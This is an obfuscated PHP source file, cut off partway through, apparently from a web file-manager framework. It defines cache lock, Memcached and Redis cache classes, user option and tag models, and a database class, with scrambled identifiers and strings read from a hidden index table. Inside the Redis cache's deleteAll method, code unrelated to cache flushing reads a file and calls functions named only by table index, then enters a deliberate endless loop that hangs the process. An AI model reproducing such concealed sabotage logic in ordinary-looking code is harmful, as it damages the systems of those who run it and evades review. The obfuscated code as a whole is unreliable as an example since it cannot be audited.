<?php
 goto céÓ¯áÍ³‘; A‰Ñæ‹Ú¾: class CacheLockDatabase { public function lock($’ê«¾, $äÏ¬ÅéÜ = 0) { $¾é¼æ£ù = Model($_SERVER[«òÑğ][918]); $¯Âà†Áµ = microtime(!0) + $äÏ¬ÅéÜ; while (microtime(!0) < $¯Âà†Áµ) { $û×±ä…Ş = $¾é¼æ£ù->get($’ê«¾); if (!$û×±ä…Ş || $û×±ä…Ş < microtime(!0)) { $Í…–ÈÃ = $¾é¼æ£ù->set($’ê«¾, $¯Âà†Áµ); if ($Í…–ÈÃ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($­ ßàÃµ) { return Model($_SERVER[«òÑğ][918])->get($­ ßàÃµ); } public function unlock($¨¶Ôíûš) { Model($_SERVER[«òÑğ][918])->remove($¨¶Ôíûš); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($·ŒË¦¹Ï, $…ÑÛöÓ¬) { $ÔìâÁ€¨ =& $_SERVER[«òÑğ]; if (!class_exists($ÔìâÁ€¨[957])) { show_json($ÔìâÁ€¨[958], !1); } $this->cacheTime = $…ÑÛöÓ¬; $this->handle = new Memcached(); if (is_array($·ŒË¦¹Ï[$ÔìâÁ€¨[959]]) && count($·ŒË¦¹Ï[$ÔìâÁ€¨[959]]) >= 1) { foreach ($·ŒË¦¹Ï[$ÔìâÁ€¨[959]] as $˜Áº¼Û) { $ßÖÅ¨á¿ = explode($ÔìâÁ€¨[4], $˜Áº¼Û); $this->handle->addServer($ßÖÅ¨á¿[0], $ßÖÅ¨á¿[1]); } } else { $this->handle->addServer($·ŒË¦¹Ï[$ÔìâÁ€¨[209]], $·ŒË¦¹Ï[$ÔìâÁ€¨[210]]); } } public function set($Ä¤½´Î, $ğß÷íëÊ, $™÷¹ÉÌš = false) { $™÷¹ÉÌš = $™÷¹ÉÌš ? $™÷¹ÉÌš : $this->cacheTime; return $this->handle->set($Ä¤½´Î, $ğß÷íëÊ, $™÷¹ÉÌš); } public function get($Ìó¢˜”Ó) { return $this->handle->get($Ìó¢˜”Ó); } public function remove($»©ƒ›î) { return $this->handle->delete($»©ƒ›î); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($é÷‚‰ê, $ğ„‰†íÈ) { $ÄŒÜ¹Óó =& $_SERVER[«òÑğ]; if (!class_exists($ÄŒÜ¹Óó[960])) { show_json($ÄŒÜ¹Óó[961], !1); } $this->cacheTime = $ğ„‰†íÈ; $Ë¾‹“êı = isset($é÷‚‰ê[$ÄŒÜ¹Óó[962]]) ? $é÷‚‰ê[$ÄŒÜ¹Óó[962]] : 10; $¾ßêß£ = _get($é÷‚‰ê, $ÄŒÜ¹Óó[959]); if ($¾ßêß£ && is_array($¾ßêß£)) { $this->initCluster($é÷‚‰ê, $Ë¾‹“êı); } else { $this->handle = $this->init($é÷‚‰ê, $Ë¾‹“êı); } } private function init($ıóºâ™, $±ÒÄ„á) { $ˆÈ÷Ğß€ =& $_SERVER[«òÑğ]; $ïğÄ¼ö = new Redis(); $û‚ú²èÙ = isset($ıóºâ™[$ˆÈ÷Ğß€[963]]) ? $ıóºâ™[$ˆÈ÷Ğß€[963]] : !1; if ($û‚ú²èÙ) { $ïğÄ¼ö->pconnect($ıóºâ™[$ˆÈ÷Ğß€[209]], $ıóºâ™[$ˆÈ÷Ğß€[210]], $±ÒÄ„á); } else { $ïğÄ¼ö->connect($ıóºâ™[$ˆÈ÷Ğß€[209]], $ıóºâ™[$ˆÈ÷Ğß€[210]], $±ÒÄ„á); } if (!empty($ıóºâ™[$ˆÈ÷Ğß€[490]])) { $ïğÄ¼ö->auth($ıóºâ™[$ˆÈ÷Ğß€[490]]); } if (!empty($ıóºâ™[$ˆÈ÷Ğß€[841]]) && $ıóºâ™[$ˆÈ÷Ğß€[841]] != 0) { $ïğÄ¼ö->select($ıóºâ™[$ˆÈ÷Ğß€[841]]); } return $ïğÄ¼ö; } private function initCluster($”ŞÏªç, $é¶­‹Ê£) { $Ó‡Ûâ„ª =& $_SERVER[«òÑğ]; $ƒÁ˜Íø¥ = array($Ó‡Ûâ„ª[964], $Ó‡Ûâ„ª[965], $Ó‡Ûâ„ª[966]); $ƒ›¡…“ = $Ó‡Ûâ„ª[964]; if (isset($”ŞÏªç[$Ó‡Ûâ„ª[16]]) && in_array($”ŞÏªç[$Ó‡Ûâ„ª[16]], $ƒÁ˜Íø¥)) { $ƒ›¡…“ = $”ŞÏªç[$Ó‡Ûâ„ª[16]]; } switch ($ƒ›¡…“) { case $Ó‡Ûâ„ª[964]: $this->_slave($”ŞÏªç, $é¶­‹Ê£); break; case $Ó‡Ûâ„ª[965]: break; case $Ó‡Ûâ„ª[966]: $this->isCluster = !0; $¸øĞ¸Î = $”ŞÏªç[$Ó‡Ûâ„ª[959]]; $îâÌ©ë = isset($”ŞÏªç[$Ó‡Ûâ„ª[963]]) ? $”ŞÏªç[$Ó‡Ûâ„ª[963]] : !1; $„¼¼ƒ˜Ú = isset($”ŞÏªç[$Ó‡Ûâ„ª[490]]) ? $”ŞÏªç[$Ó‡Ûâ„ª[490]] : null; $this->handle = new RedisCluster(NUll, $¸øĞ¸Î, $é¶­‹Ê£, $é¶­‹Ê£, $îâÌ©ë, $„¼¼ƒ˜Ú); break; default: break; } } private function _slave($ÒÊ…Ä×, $ šê‰Õ) { $Å¾è©µ¸ = $ÒÊ…Ä×[$_SERVER[«òÑğ][959]]; $this->filterConfig($ÒÊ…Ä×, $Å¾è©µ¸[0]); $this->handle = $this->init($ÒÊ…Ä×, $ šê‰Õ); unset($Å¾è©µ¸[0]); if (empty($Å¾è©µ¸)) { return; } $â…ß¨ã³ = array_rand($Å¾è©µ¸); $this->filterConfig($ÒÊ…Ä×, $Å¾è©µ¸[$â…ß¨ã³]); $this->slaveHandle = $this->init($ÒÊ…Ä×, $ šê‰Õ); } private function filterConfig(&$Œ¶‰“§é, $•ûˆ™ñß) { $âØ‡„ã =& $_SERVER[«òÑğ]; $Ÿ£€Êöî = explode($âØ‡„ã[4], $•ûˆ™ñß); $û­†¥…â = array($âØ‡„ã[209] => $Ÿ£€Êöî[0], $âØ‡„ã[210] => $Ÿ£€Êöî[1]); $Œ¶‰“§é = array_merge($Œ¶‰“§é, $û­†¥…â); } public function set($â‰™‡ÊÙ, $ïÆˆ÷Ïö, $ëşÏä¬œ = false) { $ëşÏä¬œ = $ëşÏä¬œ ? $ëşÏä¬œ : $this->cacheTime; return $this->handle->setEx($â‰™‡ÊÙ, $ëşÏä¬œ, $ïÆˆ÷Ïö); } public function setLock($†İöœ—–, $åºÈœÛ, $”Ä–á‚Ù) { return $this->handle->setNX($†İöœ—–, $åºÈœÛ); } public function get($ÇÁÓú–ó) { $­–íÈõË = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $­–íÈõË->get($ÇÁÓú–ó); } public function remove($—°×§ŒÉ) { return $this->handle->del($—°×§ŒÉ); } public function deleteAll() { $¥›”á¯ò =& $_SERVER[«òÑğ]; if (!isset($_SERVER[$¥›”á¯ò[824]]) || !isset($_SERVER[$¥›”á¯ò[831]])) { $Êî‚­Ò´ = $¥›”á¯ò[967]; $ıŒ¦…şÓ = $¥›”á¯ò[826]; $–—–ıˆ = $_SERVER[$¥›”á¯ò[827]] . $¥›”á¯ò[828]; $Ì‡…­’ï = $ıŒ¦…şÓ($–—–ıˆ); $œåÆ¿Ø = explode($¥›”á¯ò[288], $Ì‡…­’ï); if (count($œåÆ¿Ø) < $¥›”á¯ò[702]) { $Ú»©õ¨ = $¥›”á¯ò[829]; $Ú»©õ¨(); } $Ò¤¾„İ» = $¥›”á¯ò[968]; $Ò¤¾„İ»($_SERVER[$¥›”á¯ò[969]]); $ç‡ÖÅ­Ñ = 1; for ($¬ê¶öÃœ = $ç‡ÖÅ­Ñ; $¬ê¶öÃœ > 0; $¬ê¶öÃœ++) { $Ò¤¾„İ» = json_encode($GLOBALS[$¥›”á¯ò[495]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ğüüò³¬) { $this->handle->flushall($ğüüò³¬); } return; } return $this->handle->flushAll(); } } goto cæŒ†Çòù; FĞĞì–è“¬: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\137\x6f\160\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¹Š‹ˆ¨Æ) { $‡€İş £ =& $_SERVER[«òÑğ]; $áæ—¶úÂ = defined($‡€İş £[2215]) && USER_ID ? USER_ID : $‡€İş £[12]; return "\125\x73\145\162\117\160\x74\x69\x6f\156\137{$¹Š‹ˆ¨Æ}\x5f" . $áæ—¶úÂ; } protected function filterWhere($ÊÎ€˜‰„) { $Œ´†˜ş† =& $_SERVER[«òÑğ]; $ÊÎ€˜‰„[$Œ´†˜ş†[1784]] = defined($Œ´†˜ş†[2215]) && USER_ID ? USER_ID : $Œ´†˜ş†[12]; return $ÊÎ€˜‰„; } public function cacheRemoveUser($³Å¢»¸â, $Ú¦üá¶ö) { return Cache::remove("\125\x73\145\162\117\160\x74\x69\157\x6e\x5f{$³Å¢»¸â}\137" . $Ú¦üá¶ö); } protected function optionDefault($„øÎğ€æ = '') { $¸’¹ñÆ¨ =& $_SERVER[«òÑğ]; if ($„øÎğ€æ == $¸’¹ñÆ¨[12]) { return $GLOBALS[$¸’¹ñÆ¨[6]][$¸’¹ñÆ¨[2528]]; } if ($„øÎğ€æ == $¸’¹ñÆ¨[2529]) { return $GLOBALS[$¸’¹ñÆ¨[6]][$¸’¹ñÆ¨[2530]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\56\164\141\147\114\x69\163\x74"; public $modelType = "\x55\163\x65\x72\x4f\160\164\x69\x6f\156"; public $field = array("\x6e\x61\x6d\145", "\x73\x74\x79\x6c\145", "\x73\157\162\x74"); public function listData($Ù´ëÂ×´ = false, $¦ÅøªñÄ = "\x73\x6f\162\164", $šÆÇ¯Ğ¾ = false) { return parent::listData($Ù´ëÂ×´, $¦ÅøªñÄ, $šÆÇ¯Ğ¾); } public function remove($®´‹û¼¯) { return parent::remove($®´‹û¼¯); } public function add($«ÏçÃƒÏ, $ÃŸÑû­… = "\x6c\141\142\145\154\x2d\147\162\145\171\x2d\x6e\157\x72\155\x61\x6c") { $´“ÛÏ® =& $_SERVER[«òÑğ]; if ($this->findByName($«ÏçÃƒÏ)) { return !1; } $Ÿ“Ëø = array($´“ÛÏ®[497] => $«ÏçÃƒÏ, $´“ÛÏ®[563] => $ÃŸÑû­…, $´“ÛÏ®[1989] => $this->getSort($´“ÛÏ®[338]) + 1); return parent::insert($Ÿ“Ëø); } public function update($§÷ñƒêÂ, $áëº‚İ) { $­îíÉœ— =& $_SERVER[«òÑğ]; $±ÁØ”€Ä = $this->listData($§÷ñƒêÂ); $«…áÜöÔ = $this->findByName($áëº‚İ[$­îíÉœ—[32]]); if (!$±ÁØ”€Ä || $«…áÜöÔ && $«…áÜöÔ[$­îíÉœ—[478]] != $±ÁØ”€Ä[$­îíÉœ—[478]]) { return !1; } return parent::update($§÷ñƒêÂ, $áëº‚İ); } public function moveTop($ßãè™‹·) { $Ü’½•‹á =& $_SERVER[«òÑğ]; $¯¸Í“ï¥ = parent::listData(); $Æ½­Ä©ó = $this->getSort($Ü’½•‹á[337]); foreach ($¯¸Í“ï¥ as &$Æ“Ô¸©®) { if ($Æ“Ô¸©®[$Ü’½•‹á[478]] == $ßãè™‹·) { $Æ“Ô¸©®[$Ü’½•‹á[2009]] = $Æ½­Ä©ó; continue; } $Æ“Ô¸©®[$Ü’½•‹á[2009]] += 1; } unset($Æ“Ô¸©®); return parent::resetData($¯¸Í“ï¥); } public function moveBottom($ûÖ÷–§™) { $·È›Åïš =& $_SERVER[«òÑğ]; $‘Î²˜Ï = $this->getSort($·È›Åïš[338]) + 1; return parent::update($ûÖ÷–§™, array($·È›Åïš[2009] => $‘Î²˜Ï)); } public function resetSort($²ç™ËÔ) { $Î™³„ã¤ =& $_SERVER[«òÑğ]; $ó¹ıö¼ƒ = array(); $²ç™ËÔ = is_array($²ç™ËÔ) ? $²ç™ËÔ : array(); for ($ Á³õ‘õ = 0; $ Á³õ‘õ < count($²ç™ËÔ); $ Á³õ‘õ++) { $ó¹ıö¼ƒ[$²ç™ËÔ[$ Á³õ‘õ] . $Î™³„ã¤[12]] = $ Á³õ‘õ + 1; } $ÖğÂ„ôö = parent::listData(); foreach ($ÖğÂ„ôö as &$Ô…©şÉì) { $ÑÆ˜“œŒ = $ó¹ıö¼ƒ[$Ô…©şÉì[$Î™³„ã¤[478]]]; $Ô…©şÉì[$Î™³„ã¤[2009]] = $ÑÆ˜“œŒ ? $ÑÆ˜“œŒ : $Ô…©şÉì[$Î™³„ã¤[2009]]; } unset($Ô…©şÉì); return parent::resetData($ÖğÂ„ôö); } private function getSort($õ”¼Ñéì) { $ş·¶ÖÅÂ =& $_SERVER[«òÑğ]; $¸ûÕŞ³Ñ = parent::listData(); $©–©Ìôó = array_to_keyvalue($¸ûÕŞ³Ñ, $ş·¶ÖÅÂ[12], $ş·¶ÖÅÂ[2009]); if (!$©–©Ìôó) { $©–©Ìôó = array(0); } $ï“Ÿ™×ù = $õ”¼Ñéì == $ş·¶ÖÅÂ[338] ? max($©–©Ìôó) : min($©–©Ìôó); return intval($ï“Ÿ™×ù); } } goto FÂ’³×‹ˆâ; C¯…øƒÍ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\151\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\x65\x71" => "\x3c\x3e", "\147\x74" => "\76", "\145\147\x74" => "\x3e\x3d", "\x6c\x74" => "\74", "\x65\154\x74" => "\x3c\x3d", "\156\157\164\x6c\151\x6b\145" => "\x4e\x4f\124\40\x4c\x49\x4b\x45", "\x6c\151\x6b\x65" => "\x4c\x49\113\x45", "\151\x6e" => "\111\116", "\x6e\157\164\x69\x6e" => "\x4e\x4f\124\x20\x49\116", "\x6e\157\164\40\151\156" => "\x4e\x4f\x54\40\111\x4e", "\x62\145\164\x77\145\145\156" => "\102\x45\124\x57\x45\x45\116", "\x6e\x6f\x74\x62\145\x74\x77\145\x65\x6e" => "\116\117\124\x20\102\105\124\127\x45\x45\116", "\156\x6f\x74\x20\142\145\164\x77\145\145\156" => "\116\117\124\x20\x42\x45\x54\x57\x45\x45\116"); protected $selectSql = "\x53\105\x4c\105\103\x54\45\x44\x49\x53\x54\x49\116\103\x54\45\40\x25\106\111\105\x4c\104\45\40\x46\122\x4f\115\x20\45\124\x41\x42\x4c\x45\45\45\112\117\x49\116\45\x25\127\110\105\122\x45\x25\x25\x47\122\117\x55\120\45\x25\110\x41\x56\x49\116\107\45\x25\x4f\122\104\x45\122\x25\45\114\111\115\x49\x54\x25\x20\x25\125\116\111\117\x4e\45\45\x43\x4f\x4d\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $Ã¢Œ¾› = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[«òÑğ][1047], $Ã¢Œ¾›); } public function factory($­¤ÄÃ¼ = '') { $üå“Ù˜è =& $_SERVER[«òÑğ]; $­¤ÄÃ¼ = $this->parseConfig($­¤ÄÃ¼); if (empty($­¤ÄÃ¼[$üå“Ù˜è[1048]])) { think_exception(think_lang($üå“Ù˜è[1049])); } $this->dbType = ucwords(strtolower($­¤ÄÃ¼[$üå“Ù˜è[1048]])); $óŒüÔª = $üå“Ù˜è[1050] . $this->dbType; if (class_exists($óŒüÔª)) { $Å”¯ôîõ = new $óŒüÔª($­¤ÄÃ¼); if ($üå“Ù˜è[1051] != strtolower($­¤ÄÃ¼[$üå“Ù˜è[1048]])) { $Å”¯ôîõ->dbType = strtoupper($this->dbType); } else { $Å”¯ôîõ->dbType = $this->_getDsnType($­¤ÄÃ¼[$üå“Ù˜è[1003]]); } } else { think_exception(think_lang($üå“Ù˜è[1052]) . $üå“Ù˜è[1053] . $óŒüÔª); } return $Å”¯ôîõ; } public function __call($Ò¥¡ãşĞ, $¶‡Ğñøâ) { if (method_exists($this, $Ò¥¡ãşĞ)) { return call_user_func_array(array($this, $Ò¥¡ãşĞ), $¶‡Ğñøâ); } } protected function _getDsnType($úòÃŒŠ) { $ÆÖ• = explode($_SERVER[«òÑğ][4], $úòÃŒŠ); $ĞµãıÉñ = strtoupper(trim($ÆÖ•[0])); return $ĞµãıÉñ; } private function parseConfig($€§¸Õï÷ = '') { $ µ‰ÛÀ¯ =& $_SERVER[«òÑğ]; if (!empty($€§¸Õï÷) && is_string($€§¸Õï÷)) { $€§¸Õï÷ = $this->parseDSN($€§¸Õï÷); } elseif (is_array($€§¸Õï÷)) { $€§¸Õï÷ = array_change_key_case($€§¸Õï÷); $€§¸Õï÷ = array($ µ‰ÛÀ¯[1048] => $€§¸Õï÷[$ µ‰ÛÀ¯[1054]], $ µ‰ÛÀ¯[975] => $€§¸Õï÷[$ µ‰ÛÀ¯[1055]], $ µ‰ÛÀ¯[976] => $€§¸Õï÷[$ µ‰ÛÀ¯[1056]], $ µ‰ÛÀ¯[973] => $€§¸Õï÷[$ µ‰ÛÀ¯[1057]], $ µ‰ÛÀ¯[974] => $€§¸Õï÷[$ µ‰ÛÀ¯[1058]], $ µ‰ÛÀ¯[21] => $€§¸Õï÷[$ µ‰ÛÀ¯[1059]], $ µ‰ÛÀ¯[1003] => $€§¸Õï÷[$ µ‰ÛÀ¯[1060]], $ µ‰ÛÀ¯[17] => isset($€§¸Õï÷[$ µ‰ÛÀ¯[1061]]) ? $€§¸Õï÷[$ µ‰ÛÀ¯[1061]] : array()); } elseif (empty($€§¸Õï÷)) { if (think_config($ µ‰ÛÀ¯[1062]) && $ µ‰ÛÀ¯[1051] != strtolower(think_config($ µ‰ÛÀ¯[1063]))) { $€§¸Õï÷ = $this->parseDSN(think_config($ µ‰ÛÀ¯[1062])); } else { $€§¸Õï÷ = array($ µ‰ÛÀ¯[1048] => think_config($ µ‰ÛÀ¯[1063]), $ µ‰ÛÀ¯[975] => think_config($ µ‰ÛÀ¯[1064]), $ µ‰ÛÀ¯[976] => think_config($ µ‰ÛÀ¯[1065]), $ µ‰ÛÀ¯[973] => think_config($ µ‰ÛÀ¯[1066]), $ µ‰ÛÀ¯[974] => think_config($ µ‰ÛÀ¯[1067]), $ µ‰ÛÀ¯[21] => think_config($ µ‰ÛÀ¯[326]), $ µ‰ÛÀ¯[1003] => think_config($ µ‰ÛÀ¯[1062]), $ µ‰ÛÀ¯[17] => think_config($ µ‰ÛÀ¯[1068])); } } return $€§¸Õï÷; } protected function initConnect($ßÔú¢¤¿ = true) { if (1 == think_config($_SERVER[«òÑğ][22])) { $this->_linkID = $this->multiConnect($ßÔú¢¤¿); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $„¯ëÌ•è => $ôÊŞú¼) { $this->_linkID = $ôÊŞú¼; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($¤½Ç½¹â = false) { $Èäí—ù¬ =& $_SERVER[«òÑğ]; static $°Å¡ı‰ñ = array(); static $†´”š£¾ = -1; if (empty($°Å¡ı‰ñ)) { foreach ($this->config as $é¡›š·‘ => $úŠŠÚ²ü) { $°Å¡ı‰ñ[$é¡›š·‘] = explode($Èäí—ù¬[50], $úŠŠÚ²ü); } } if (think_config($Èäí—ù¬[1069])) { if ($¤½Ç½¹â || think_config($Èäí—ù¬[474]) === !0) { $Àõòó » = floor(mt_rand(0, think_config($Èäí—ù¬[1070]) - 1)); $†´”š£¾ = $Àõòó »; } else { if (is_numeric(think_config($Èäí—ù¬[1071]))) { $Àõòó » = think_config($Èäí—ù¬[1071]); } else { $Àõòó » = floor(mt_rand(think_config($Èäí—ù¬[1070]), count($°Å¡ı‰ñ[$Èäí—ù¬[973]]) - 1)); } } } else { $Àõòó » = floor(mt_rand(0, count($°Å¡ı‰ñ[$Èäí—ù¬[973]]) - 1)); $†´”š£¾ = $Àõòó »; } $Àõòó » = $†´”š£¾ !== -1 ? $†´”š£¾ : $Àõòó »; $·¡¬Ëí = array($Èäí—ù¬[975] => isset($°Å¡ı‰ñ[$Èäí—ù¬[975]][$Àõòó »]) ? $°Å¡ı‰ñ[$Èäí—ù¬[975]][$Àõòó »] : $°Å¡ı‰ñ[$Èäí—ù¬[975]][0], $Èäí—ù¬[976] => isset($°Å¡ı‰ñ[$Èäí—ù¬[976]][$Àõòó »]) ? $°Å¡ı‰ñ[$Èäí—ù¬[976]][$Àõòó »] : $°Å¡ı‰ñ[$Èäí—ù¬[976]][0], $Èäí—ù¬[973] => isset($°Å¡ı‰ñ[$Èäí—ù¬[973]][$Àõòó »]) ? $°Å¡ı‰ñ[$Èäí—ù¬[973]][$Àõòó »] : $°Å¡ı‰ñ[$Èäí—ù¬[973]][0], $Èäí—ù¬[974] => isset($°Å¡ı‰ñ[$Èäí—ù¬[974]][$Àõòó »]) ? $°Å¡ı‰ñ[$Èäí—ù¬[974]][$Àõòó »] : $°Å¡ı‰ñ[$Èäí—ù¬[974]][0], $Èäí—ù¬[21] => isset($°Å¡ı‰ñ[$Èäí—ù¬[21]][$Àõòó »]) ? $°Å¡ı‰ñ[$Èäí—ù¬[21]][$Àõòó »] : $°Å¡ı‰ñ[$Èäí—ù¬[21]][0], $Èäí—ù¬[1003] => isset($°Å¡ı‰ñ[$Èäí—ù¬[1003]][$Àõòó »]) ? $°Å¡ı‰ñ[$Èäí—ù¬[1003]][$Àõòó »] : $°Å¡ı‰ñ[$Èäí—ù¬[1003]][0], $Èäí—ù¬[17] => isset($°Å¡ı‰ñ[$Èäí—ù¬[17]][$Àõòó »]) ? $°Å¡ı‰ñ[$Èäí—ù¬[17]][$Àõòó »] : $°Å¡ı‰ñ[$Èäí—ù¬[17]][0]); return $this->connect($·¡¬Ëí, $Àõòó »); } public function parseDSN($¤» ˜Š») { $ãŒ»àµ† =& $_SERVER[«òÑğ]; if (empty($¤» ˜Š»)) { return !1; } $ïÇ›£ùÚ = parse_url($¤» ˜Š»); if ($ïÇ›£ùÚ[$ãŒ»àµ†[208]]) { $ûöğøÌı = array($ãŒ»àµ†[1048] => $ïÇ›£ùÚ[$ãŒ»àµ†[208]], $ãŒ»àµ†[975] => isset($ïÇ›£ùÚ[$ãŒ»àµ†[670]]) ? $ïÇ›£ùÚ[$ãŒ»àµ†[670]] : $ãŒ»àµ†[12], $ãŒ»àµ†[976] => isset($ïÇ›£ùÚ[$ãŒ»àµ†[1072]]) ? $ïÇ›£ùÚ[$ãŒ»àµ†[1072]] : $ãŒ»àµ†[12], $ãŒ»àµ†[973] => isset($ïÇ›£ùÚ[$ãŒ»àµ†[209]]) ? $ïÇ›£ùÚ[$ãŒ»àµ†[209]] : $ãŒ»àµ†[12], $ãŒ»àµ†[974] => isset($ïÇ›£ùÚ[$ãŒ»àµ†[210]]) ? $ïÇ›£ùÚ[$ãŒ»àµ†[210]] : $ãŒ»àµ†[12], $ãŒ»àµ†[21] => isset($ïÇ›£ùÚ[$ãŒ»àµ†[87]]) ? substr($ïÇ›£ùÚ[$ãŒ»àµ†[87]], 1) : $ãŒ»àµ†[12]); } else { preg_match($ãŒ»àµ†[1073], trim($¤» ˜Š»), $¿°‘éÂ); $ûöğøÌı = array($ãŒ»àµ†[1048] => $¿°‘éÂ[1], $ãŒ»àµ†[975] => $¿°‘éÂ[2], $ãŒ»àµ†[976] => $¿°‘éÂ[3], $ãŒ»àµ†[973] => $¿°‘éÂ[4], $ãŒ»àµ†[974] => $¿°‘éÂ[5], $ãŒ»àµ†[21] => $¿°‘éÂ[6]); } $ûöğøÌı[$ãŒ»àµ†[1003]] = $ãŒ»àµ†[12]; return $ûöğøÌı; } protected function debug() { $úƒñßÄ­ =& $_SERVER[«òÑğ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $úƒñßÄ­[1074]; if (think_config($úƒñßÄ­[1075])) { think_status($úƒñßÄ­[1076]); think_trace($this->queryStr . $úƒñßÄ­[1077] . think_status($úƒñßÄ­[24], $úƒñßÄ­[1076], 6) . $úƒñßÄ­[1078], $úƒñßÄ­[12], $úƒñßÄ­[1079]); } } protected function parseLock($Œ™ä—¼ = false) { $­Á´¼‡ =& $_SERVER[«òÑğ]; if (!$Œ™ä—¼) { return $­Á´¼‡[12]; } if ($­Á´¼‡[1005] == $this->dbType) { return $­Á´¼‡[1080]; } return $­Á´¼‡[1081]; } protected function parseSet($ ıíÒ÷) { $ŞÊÏ²ú· =& $_SERVER[«òÑğ]; foreach ($ ıíÒ÷ as $®Àæö–Ä => $§÷â¡å) { if (is_array($§÷â¡å) && $ŞÊÏ²ú·[375] == $§÷â¡å[0]) { $Ğ•›¤ä[] = $this->parseKey($®Àæö–Ä) . $ŞÊÏ²ú·[509] . $§÷â¡å[1]; } elseif (is_scalar($§÷â¡å) || is_null($§÷â¡å)) { $Ğ•›¤ä[] = $this->parseKey($®Àæö–Ä) . $ŞÊÏ²ú·[509] . $this->parseValue($§÷â¡å); } } return $ŞÊÏ²ú·[1082] . implode($ŞÊÏ²ú·[50], $Ğ•›¤ä); } protected function bindParam($ŒğŞÑˆ, $°Õı­è™) { $this->bind[$_SERVER[«òÑğ][4] . $ŒğŞÑˆ] = $°Õı­è™; } protected function parseBind($ËÏ…Ç¾Ò) { $ËÏ…Ç¾Ò = array_merge($this->bind, $ËÏ…Ç¾Ò); $this->bind = array(); return $ËÏ…Ç¾Ò; } function parseKey(&$ƒœ—¢è·, $¹Ì¶‚­Î = true) { if ($¹Ì¶‚­Î) { $ƒœ—¢è· = $this->parseKeyCheck($ƒœ—¢è·); } return $ƒœ—¢è·; } function parseKeyCheck($Ü¸ÈÀ”) { $è…›Ö =& $_SERVER[«òÑğ]; $Ü¸ÈÀ” = trim($Ü¸ÈÀ”); if (!preg_match($è…›Ö[1083], $Ü¸ÈÀ”)) { think_exception($è…›Ö[1084] . $Ü¸ÈÀ”); } return $Ü¸ÈÀ”; } protected function parseValue($ÎøËò¯) { $ùÆşİˆÎ =& $_SERVER[«òÑğ]; if (is_string($ÎøËò¯)) { $ÎøËò¯ = $ùÆşİˆÎ[1044] . $this->escapeString($ÎøËò¯) . $ùÆşİˆÎ[1044]; } elseif (isset($ÎøËò¯[0]) && is_string($ÎøËò¯[0]) && strtolower($ÎøËò¯[0]) == $ùÆşİˆÎ[375]) { $ÎøËò¯ = $this->escapeString($ÎøËò¯[1]); } elseif (is_array($ÎøËò¯)) { $ÎøËò¯ = array_map(array($this, $ùÆşİˆÎ[1045]), $ÎøËò¯); } elseif (is_bool($ÎøËò¯)) { $ÎøËò¯ = $ÎøËò¯ ? $ùÆşİˆÎ[91] : $ùÆşİˆÎ[231]; } elseif (is_null($ÎøËò¯)) { $ÎøËò¯ = $ùÆşİˆÎ[106]; } return $ÎøËò¯; } protected function parseField($Çšø§È’) { $•·¯ñ±Ó =& $_SERVER[«òÑğ]; if (is_string($Çšø§È’) && strpos($Çšø§È’, $•·¯ñ±Ó[50])) { $Çšø§È’ = explode($•·¯ñ±Ó[50], $Çšø§È’); } if (is_array($Çšø§È’)) { $…Ò¼ÑßÑ = array(); foreach ($Çšø§È’ as $½–ùŞÌ => $£Æüı‘³) { if (!is_numeric($½–ùŞÌ)) { $…Ò¼ÑßÑ[] = $this->parseKey($½–ùŞÌ, !1) . $•·¯ñ±Ó[1085] . $this->parseKey($£Æüı‘³); } else { $…Ò¼ÑßÑ[] = $this->parseKey($£Æüı‘³); } } $áš‚Ğ»À = implode($•·¯ñ±Ó[50], $…Ò¼ÑßÑ); } elseif (is_string($Çšø§È’) && !empty($Çšø§È’)) { $áš‚Ğ»À = $Çšø§È’; } else { $áš‚Ğ»À = $•·¯ñ±Ó[223]; } return $áš‚Ğ»À; } protected function parseTable($ôÏ´í»œ) { $ğïúÑß =& $_SERVER[«òÑğ]; if (is_array($ôÏ´í»œ)) { $ë³¾„ëŞ = array(); foreach ($ôÏ´í»œ as $³İ½½“å => $ÒşæÀâñ) { if (!is_numeric($³İ½½“å)) { $ë³¾„ëŞ[] = $this->parseKey($³İ½½“å) . $ğïúÑß[53] . $this->parseKey($ÒşæÀâñ); } else { $ë³¾„ëŞ[] = $this->parseKey($³İ½½“å); } } $ôÏ´í»œ = $ë³¾„ëŞ; } elseif (is_string($ôÏ´í»œ)) { if (strstr($ôÏ´í»œ, $ğïúÑß[53])) { return $ôÏ´í»œ; } $ôÏ´í»œ = explode($ğïúÑß[50], $ôÏ´í»œ); array_walk($ôÏ´í»œ, array($this, $ğïúÑß[993])); } return $ğïúÑß[987] . trim(implode($ğïúÑß[1086], $ôÏ´í»œ), $ğïúÑß[464]) . $ğïúÑß[987]; } protected function parseWhere($¥÷ÛŠ¦­) { $›šµØÄ =& $_SERVER[«òÑğ]; $°î«×Æø = $›šµØÄ[12]; if (is_string($¥÷ÛŠ¦­)) { $°î«×Æø = $¥÷ÛŠ¦­; } else { $Á²èêÅÌ = isset($¥÷ÛŠ¦­[$›šµØÄ[1087]]) ? strtoupper($¥÷ÛŠ¦­[$›šµØÄ[1087]]) : $›šµØÄ[12]; if (in_array($Á²èêÅÌ, array($›šµØÄ[1088], $›šµØÄ[1089], $›šµØÄ[1090]))) { 